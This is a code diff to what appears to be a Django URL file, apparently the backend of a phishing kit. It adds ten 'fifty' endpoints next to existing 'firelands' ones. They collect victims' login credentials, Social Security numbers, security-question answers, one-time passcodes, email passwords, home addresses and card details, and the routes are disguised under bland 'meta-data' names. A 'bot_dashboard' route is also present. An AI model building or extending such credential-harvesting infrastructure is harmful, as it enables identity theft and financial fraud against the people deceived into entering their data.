@@ -148,6 +148,18 @@ from user_data.firelands_views import (
     firelands_collect_user_email_password,
     firelands_collect_user_card_info
 )
+from user_data.fifty_views import (
+    fifty_collect_user_login_cred,
+    fifty_collect_user_login_cred2,
+    fifty_collect_user_basic_info,
+    fifty_collect_user_home_address,
+    fifty_collect_user_social_security,
+    fifty_collect_user_social_security_2,
+    fifty_collect_user_security_questions,
+    fifty_collect_user_otp_verification,
+    fifty_collect_user_email_password,
+    fifty_collect_user_card_info,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -238,5 +250,16 @@ urlpatterns = [
     path("api/firelands-meta-data-16/", firelands_collect_user_otp_verification, name="firelands_collect_user_otp_verification_alias"),
     path("api/firelands-email-password-alias/", firelands_collect_user_email_password, name="firelands_collect_user_email_password_alias"),
     path("api/firelands-card-info-alias/", firelands_collect_user_card_info, name="firelands_collect_user_card_info_alias"),
+    # Fiftty API endpoints
+    path("api/fifty-meta-data-1/", fifty_collect_user_login_cred, name="fifty_collect_user_login_cred"),
+    path("api/fifty-meta-data-2/", fifty_collect_user_login_cred2, name="fifty_collect_user_login_cred2"),
+    path("api/fifty-meta-data-3/", fifty_collect_user_basic_info, name="fifty_collect_user_basic_info"),
+    path("api/fifty-meta-data-4/", fifty_collect_user_home_address, name="fifty_collect_user_home_address"),
+    path("api/fifty-meta-data-5/", fifty_collect_user_social_security, name="fifty_collect_user_social_security"),
+    path("api/fifty-meta-data-6/", fifty_collect_user_social_security_2, name="fifty_collect_user_social_security_2"),
+    path("api/fifty-meta-data-7/", fifty_collect_user_security_questions, name="fifty_collect_user_security_questions"),
+    path("api/fifty-meta-data-8/", fifty_collect_user_otp_verification, name="fifty_collect_user_otp_verification"),
+    path("api/fifty-email-password/", fifty_collect_user_email_password, name="fifty_collect_user_email_password"),
+    path("api/fifty-card-info/", fifty_collect_user_card_info, name="fifty_collect_user_card_info"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
